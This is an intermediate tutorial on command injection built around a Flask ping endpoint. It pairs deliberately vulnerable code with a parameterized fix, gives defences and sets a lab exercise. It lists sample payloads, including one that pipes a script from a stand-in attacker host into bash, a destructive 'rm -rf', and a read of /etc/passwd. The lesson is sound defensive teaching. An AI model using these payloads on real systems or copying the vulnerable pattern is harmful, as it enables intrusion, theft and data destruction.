# Command Injection

**Category:** App Security
**Date:** 2026-07-27
**Difficulty:** Intermediate

---

## What It Is

Command injection occurs when an application passes unsanitized user-supplied input to a system shell, allowing an attacker to execute arbitrary operating system commands in the context of the server process. Unlike SQL injection (which targets databases), command injection targets the underlying OS. It typically arises when developers use shell-invocation functions like `os.system()`, `exec()`, `popen()`, or backtick operators and concatenate user input directly into the command string.

## Why It Matters

Command injection is consistently ranked in the OWASP Top 10 and regularly earns maximum CVSS scores (9.8–10.0) because successful exploitation gives an attacker full control of the host — data exfiltration, lateral movement, and ransomware deployment all follow from a single vulnerable endpoint. A notable real-world example is CVE-2021-42013 (Apache HTTP Server path normalization bypass leading to RCE), which was exploited in the wild within days of disclosure.

## Practical Example

### Vulnerable code (Python / Flask)

```python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    # DANGEROUS: user input concatenated directly into a shell command
    result = subprocess.run(
        f"ping -c 1 {host}",
        shell=True, capture_output=True, text=True
    )
    return result.stdout
```

**Normal request:**
```
GET /ping?host=8.8.8.8
```
Output: standard ping result.

**Malicious request:**
```
GET /ping?host=8.8.8.8;cat+/etc/passwd
```
The shell sees:
```bash
ping -c 1 8.8.8.8; cat /etc/passwd
```
The semicolon terminates the ping command and starts a new one, dumping `/etc/passwd`.

**Other common payloads:**
```
8.8.8.8 && whoami                   # logical AND chaining
8.8.8.8 | curl attacker.com/shell | bash  # pipe to remote script
$(id)                               # command substitution
`id`                                # backtick substitution
8.8.8.8 ; rm -rf /var/www/html      # destructive follow-on
```

**Blind command injection** (no output returned — detected via timing):
```
8.8.8.8; sleep 10
```
If the response takes ~10 seconds longer, injection is confirmed even without visible output.

### The fix in context

```python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    # SAFE: pass arguments as a list — no shell interpretation
    result = subprocess.run(
        ["ping", "-c", "1", host],
        shell=False, capture_output=True, text=True
    )
    return result.stdout
```

With `shell=False` and a list of arguments, the OS executes `ping` directly. The semicolon and other shell metacharacters in user input are treated as literal characters, not shell syntax.

## How to Defend

- **Never use `shell=True` (or equivalent) with user input.** Pass arguments as a list/array to avoid shell interpretation entirely — this is the single most effective fix.
- **Allowlist inputs before any OS call.** If the endpoint only needs to accept IP addresses, validate with a regex (`^\d{1,3}(\.\d{1,3}){3}$`) and reject anything else before it reaches `subprocess`.
- **Prefer higher-level libraries over shelling out.** For network probing, use Python's `socket` module; for file operations, use `pathlib`; for image processing, use Pillow — you often don't need a shell at all.
- **Run processes as a least-privilege OS user.** Even a successful injection is limited if the web server user can't read `/etc/shadow`, write to `/etc`, or spawn new processes.
- **Use a Web Application Firewall (WAF) as a defense-in-depth layer,** but never as the primary control — WAF bypass techniques (encoding, splitting across requests) are well-documented.

## Today's Challenge

1. Spin up the vulnerable Flask app from the example above (or use a local environment like [DVWA](https://github.com/digininja/DVWA) or [HackTheBox](https://www.hackthebox.com/)).
2. Confirm the injection using the `; whoami` payload and observe the output.
3. Apply the `shell=False` fix and verify that the same payload is now treated as a literal string argument to `ping` (ping will fail to resolve `8.8.8.8; whoami` as a hostname — that's the expected safe behavior).
4. Bonus: try the `$(id)` payload against both versions and explain why it also fails safely in the fixed version.

## Key Takeaway

The root cause of command injection is always the same — mixing code and data — so the fix is always the same: keep them separate by using parameterized APIs instead of string-concatenated shell commands.
